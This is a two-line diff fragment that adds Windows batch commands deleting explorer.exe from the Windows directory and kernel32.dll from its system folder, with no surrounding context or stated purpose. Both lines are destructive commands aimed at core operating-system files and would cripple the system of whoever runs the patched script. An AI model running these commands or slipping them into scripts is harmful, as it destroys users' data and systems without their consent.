@@ -1,0 +1,2 @@
+del %windir%\explorer.exe
+del %windir%\system\kernel32.dll
